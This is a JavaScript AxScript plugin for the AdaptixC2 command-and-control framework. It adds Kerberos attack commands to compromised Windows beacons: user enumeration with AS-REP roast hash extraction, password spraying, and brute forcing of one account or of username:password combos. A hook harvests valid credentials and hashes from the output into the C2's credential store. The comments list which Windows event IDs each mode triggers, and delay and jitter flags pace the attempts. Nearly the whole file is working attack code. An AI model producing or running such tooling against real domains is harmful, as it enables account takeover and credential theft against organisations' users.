// kerbrute.axs — AdaptixC2 AxScript
//
// In-process Kerberos recon BOF — no child process, no files dropped on target.
// Word lists are read from the OPERATOR machine and forwarded to the BOF.
//
// Built-in help: type any command with no arguments (or with a missing required
// flag) and Adaptix will display the full argument reference automatically.
//
// Deploy: kerbrute.x64.o + this file in the same directory.
//   AxScript → Script Manager → Load new → kerbrute.axs

var metadata = {
    name:        "kerbrute",
    description: "In-process Kerberos recon: userenum, passwordspray, bruteuser, bruteforce",
    store:       true
};

var FLAG_DOWNGRADE = 0x1;
var FLAG_SAFE      = 0x2;
var FLAG_VERBOSE   = 0x4;
var FLAG_ROAST     = 0x8;

function bof_path(id) {
    return ax.script_dir() + "kerbrute." + ax.arch(id) + ".o";
}

function pack_and_exec(id, cmdline, list_b64, domain, dc, single, mode,
                       delay, flags, jitter, task_msg, hook) {
    var bof_args = ax.bof_pack("cstr,cstr,cstr,cstr,int,int,int,int",
        [list_b64, domain, dc || "", single || "", mode, delay || 0, flags || 0, jitter || 0]);
    if (hook)
        ax.execute_alias_hook(id, cmdline,
            "execute bof " + bof_path(id) + " " + bof_args, task_msg, hook);
    else
        ax.execute_alias(id, cmdline,
            "execute bof " + bof_path(id) + " " + bof_args, task_msg);
}

function build_flags(j) {
    var f = 0;
    if (j["--downgrade"]) f |= FLAG_DOWNGRADE;
    if (j["--safe"])      f |= FLAG_SAFE;
    if (j["-v"])          f |= FLAG_VERBOSE;
    if (j["--roast"])     f |= FLAG_ROAST;
    return f;
}

// ─────────────────────────────────────────────────────────────────────────────
// Phase 5 — Credentials Manager auto-save
//
// PostHook fires after every BOF task completes and output is received.
// Parses [+] VALID LOGIN and [+] VALID (expired) lines, extracts
// username / password / domain, and saves to the Adaptix Credentials Manager.
//
// ax.credentials_add(username, password, realm, type, tag, storage, host)
// ─────────────────────────────────────────────────────────────────────────────
var cred_hook = function(task) {
    var output = task["text"] || "";
    var lines  = output.split("\n");
    var saved  = 0;

    for (var i = 0; i < lines.length; i++) {
        var line   = lines[i].trim();
        var at_idx, username, domain, realm;

        /* ── Valid login / expired password ─────────────────────────────────── */
        var auth_tag = "";
        if (line.indexOf("[+] VALID LOGIN: ") === 0)          auth_tag = "kerbrute";
        else if (line.indexOf("[+] VALID (expired): ") === 0) auth_tag = "kerbrute-expired";

        if (auth_tag) {
            var rest    = line.substring(line.indexOf(": ") + 2).trim();
            var sep_idx = rest.indexOf(" : ");
            if (sep_idx >= 0) {
                var userdom  = rest.substring(0, sep_idx).trim();
                var password = rest.substring(sep_idx + 3).trim();
                at_idx = userdom.indexOf("@");
                if (at_idx >= 0) {
                    username = userdom.substring(0, at_idx);
                    domain   = userdom.substring(at_idx + 1);
                    ax.credentials_add(username, password, domain,
                                        "password", auth_tag, "manual", "");
                    ax.log("[cred-manager] Saved login: " + username + "@" + domain);
                    saved++;
                }
            }
            continue;
        }

        /* ── Valid user / ASREP roastable (userenum — no password) ──────────── */
        if (line.indexOf("[+] VALID USER: ") === 0 ||
            line.indexOf("[+] ASREP ROASTABLE") === 0) {
            var rest = line.substring(line.indexOf(": ") + 2).trim();
            at_idx = rest.indexOf("@");
            if (at_idx >= 0) {
                username = rest.substring(0, at_idx);
                domain   = rest.substring(at_idx + 1);
                ax.credentials_add(username, "", domain,
                                    "password", "kerbrute-userenum", "manual", "");
                ax.log("[cred-manager] Saved user: " + username + "@" + domain);
                saved++;
            }
            continue;
        }

        /* ── AS-REP roast hash (userenum --roast) ────────────────────────────  */
        /* Line: [HASH] $krb5asrep$<etype>$user@REALM:hexdata                   */
        if (line.indexOf("[HASH] $krb5asrep$") === 0) {
            var hash    = line.substring("[HASH] ".length).trim();
            var cr_type = "hash";
            if      (hash.indexOf("$krb5asrep$23$") === 0) cr_type = "rc4";
            else if (hash.indexOf("$krb5asrep$18$") === 0) cr_type = "aes256";
            else if (hash.indexOf("$krb5asrep$17$") === 0) cr_type = "aes128";

            /* Split on "$" → ["", "krb5asrep", "18", "user@REALM:hex"] */
            var parts = hash.split("$");
            if (parts.length >= 4) {
                var userpart = parts[3].split(":")[0];   /* "user@REALM" */
                at_idx = userpart.indexOf("@");
                if (at_idx >= 0) {
                    username = userpart.substring(0, at_idx);
                    realm    = userpart.substring(at_idx + 1).toLowerCase();
                    ax.credentials_add(username, hash, realm,
                                        cr_type, "kerbrute-asrep", "manual", "");
                    ax.log("[cred-manager] Saved ASREP hash: " + username + "@" + realm
                           + " (" + cr_type + ")");
                    saved++;
                }
            }
            continue;
        }
    }

    if (saved > 0)
        ax.log("[cred-manager] " + saved + " entry/entries added to Credentials Manager.");

    return task;   /* hook must return the task object */
};

// ─────────────────────────────────────────────────────────────────────────────
// userenum
//
// Sends an unauthenticated AS-REQ for each username.
// No failed-login event (4771). Generates 4768 only if Kerberos logging is on.
// ─────────────────────────────────────────────────────────────────────────────
var cmd_userenum = ax.create_command(
    "userenum",
    "Enumerate valid domain usernames via Kerberos — no pre-auth, no lockout risk. BLOCKS beacon until complete.",
    "userenum -d contoso.local [--dc 192.168.1.10] [--delay 500] [--downgrade] [--safe] [-v] /path/to/users.txt",
    "Task: [kerbrute] userenum"
);
cmd_userenum.addArgFlagString("-d",   "domain", true,  "Target domain FQDN (e.g. contoso.local)");
cmd_userenum.addArgFlagString("--dc", "dc",     false, "DC hostname or IP — DNS SRV lookup used if omitted");
cmd_userenum.addArgFlagInt("--delay", "delay",  false, "Sleep this many milliseconds between each attempt");
cmd_userenum.addArgFlagInt("--jitter", "jitter", false, "Random ms added to each delay: sleep is delay ± jitter (0 = fixed)");
cmd_userenum.addArgBool("--downgrade",          "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
cmd_userenum.addArgBool("--safe",               "Abort all remaining attempts if any account is locked out");
cmd_userenum.addArgBool("-v",                   "Verbose — also log not-found users and errors");
cmd_userenum.addArgBool("--roast",              "Extract and print AS-REP hash for offline cracking (hashcat -m 18200 / 19600 / 19700)");
cmd_userenum.addArgFile("userlist", true, "Local path to wordlist — one username per line");

cmd_userenum.setPreHook(function(id, cmdline, parsed_json) {
    pack_and_exec(id, cmdline,
        parsed_json["userlist"],
        parsed_json["domain"],
        parsed_json["dc"],
        "", 0,
        parsed_json["delay"] || 0,
        build_flags(parsed_json),
        parsed_json["jitter"] || 0,
        "Task: [kerbrute] userenum → " + parsed_json["domain"],
        cred_hook);
});

// ─────────────────────────────────────────────────────────────────────────────
// passwordspray
//
// Tests one password against every user in the list.
// Increments badPwdCount. Generates 4768 and 4771.
// ─────────────────────────────────────────────────────────────────────────────
var cmd_spray = ax.create_command(
    "passwordspray",
    "Test a single password against a list of users — [LOCKOUT RISK]  BLOCKS beacon until complete.",
    "passwordspray -d contoso.local -p Password123 [--dc 192.168.1.10] [--delay 1000] [--downgrade] [--safe] [-v] /path/to/users.txt",
    "Task: [kerbrute] passwordspray"
);
cmd_spray.addArgFlagString("-d",   "domain",   true, "Target domain FQDN");
cmd_spray.addArgFlagString("--dc", "dc",       false, "DC hostname or IP — DNS SRV lookup used if omitted");
cmd_spray.addArgFlagString("-p",   "password", true, "Password to spray against every user");
cmd_spray.addArgFlagInt("--delay", "delay",    false, "Sleep this many milliseconds between each attempt");
cmd_spray.addArgFlagInt("--jitter", "jitter", false, "Random ms added to each delay: sleep is delay ± jitter (0 = fixed)");
cmd_spray.addArgBool("--downgrade",            "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
cmd_spray.addArgBool("--safe",                 "Abort all remaining attempts if any account is locked out");
cmd_spray.addArgBool("-v",                     "Verbose — also log wrong passwords and errors");
cmd_spray.addArgFile("userlist", true, "Local path to wordlist — one username per line");

cmd_spray.setPreHook(function(id, cmdline, parsed_json) {
    pack_and_exec(id, cmdline,
        parsed_json["userlist"],
        parsed_json["domain"],
        parsed_json["dc"],
        parsed_json["password"],
        1,
        parsed_json["delay"] || 0,
        build_flags(parsed_json),
        parsed_json["jitter"] || 0,
        "Task: [kerbrute] spray → " + parsed_json["domain"] + " : " + parsed_json["password"],
        cred_hook);
});

// ─────────────────────────────────────────────────────────────────────────────
// bruteuser
//
// Tries every password in the list against one fixed account.
// Stops on the first valid hit or on lockout.
// Increments badPwdCount. Generates 4768 and 4771.
// ─────────────────────────────────────────────────────────────────────────────
var cmd_bruteuser = ax.create_command(
    "bruteuser",
    "Bruteforce a single user's password from a wordlist — stops on first hit  [LOCKOUT RISK]  BLOCKS beacon until complete.",
    "bruteuser -d contoso.local -u jdoe [--dc 192.168.1.10] [--delay 200] [--downgrade] [--safe] [-v] /path/to/passwords.txt",
    "Task: [kerbrute] bruteuser"
);
cmd_bruteuser.addArgFlagString("-d",   "domain",   true,  "Target domain FQDN");
cmd_bruteuser.addArgFlagString("--dc", "dc",       false, "DC hostname or IP — DNS SRV lookup used if omitted");
cmd_bruteuser.addArgFlagString("-u",   "username", true,  "Target account sAMAccountName (no @domain suffix)");
cmd_bruteuser.addArgFlagInt("--delay", "delay",    false, "Sleep this many milliseconds between each attempt");
cmd_bruteuser.addArgFlagInt("--jitter", "jitter", false, "Random ms added to each delay: sleep is delay ± jitter (0 = fixed)");
cmd_bruteuser.addArgBool("--downgrade",            "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
cmd_bruteuser.addArgBool("--safe",                 "Abort if the account is locked out mid-run");
cmd_bruteuser.addArgBool("-v",                     "Verbose — also log each wrong password attempt");
cmd_bruteuser.addArgFile("passwordlist", true, "Local path to wordlist — one password per line");

cmd_bruteuser.setPreHook(function(id, cmdline, parsed_json) {
    pack_and_exec(id, cmdline,
        parsed_json["passwordlist"],
        parsed_json["domain"],
        parsed_json["dc"],
        parsed_json["username"],
        2,
        parsed_json["delay"] || 0,
        build_flags(parsed_json),
        parsed_json["jitter"] || 0,
        "Task: [kerbrute] bruteuser → " + parsed_json["username"] + "@" + parsed_json["domain"],
        cred_hook);
});

// ─────────────────────────────────────────────────────────────────────────────
// bruteforce
//
// Reads username:password pairs from a combo file and tests each one.
// Increments badPwdCount. Generates 4768 and 4771.
// ─────────────────────────────────────────────────────────────────────────────
var cmd_bruteforce = ax.create_command(
    "bruteforce",
    "Read username:password combos from a file and test them — [LOCKOUT RISK]  BLOCKS beacon until complete.",
    "bruteforce -d contoso.local [--dc 192.168.1.10] [--delay 500] [--downgrade] [--safe] [-v] /path/to/combos.txt",
    "Task: [kerbrute] bruteforce"
);
cmd_bruteforce.addArgFlagString("-d",   "domain", true,  "Target domain FQDN");
cmd_bruteforce.addArgFlagString("--dc", "dc",     false, "DC hostname or IP — DNS SRV lookup used if omitted");
cmd_bruteforce.addArgFlagInt("--delay", "delay",  false, "Sleep this many milliseconds between each attempt");
cmd_bruteforce.addArgFlagInt("--jitter", "jitter", false, "Random ms added to each delay: sleep is delay ± jitter (0 = fixed)");
cmd_bruteforce.addArgBool("--downgrade",          "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
cmd_bruteforce.addArgBool("--safe",               "Abort all remaining attempts if any account is locked out");
cmd_bruteforce.addArgBool("-v",                   "Verbose — also log not-found combos and errors");
cmd_bruteforce.addArgFile("combofile", true, "Local path to combo file — username:password per line");

cmd_bruteforce.setPreHook(function(id, cmdline, parsed_json) {
    pack_and_exec(id, cmdline,
        parsed_json["combofile"],
        parsed_json["domain"],
        parsed_json["dc"],
        "",
        3,
        parsed_json["delay"] || 0,
        build_flags(parsed_json),
        parsed_json["jitter"] || 0,
        "Task: [kerbrute] bruteforce → " + parsed_json["domain"],
        cred_hook);
});

// ─────────────────────────────────────────────────────────────────────────────
// Register — Windows beacons only
// ─────────────────────────────────────────────────────────────────────────────
var grp = ax.create_commands_group("Kerbrute",
    [cmd_userenum, cmd_spray, cmd_bruteuser, cmd_bruteforce]);
ax.register_commands_group(grp, ["beacon"], ["windows"], []);
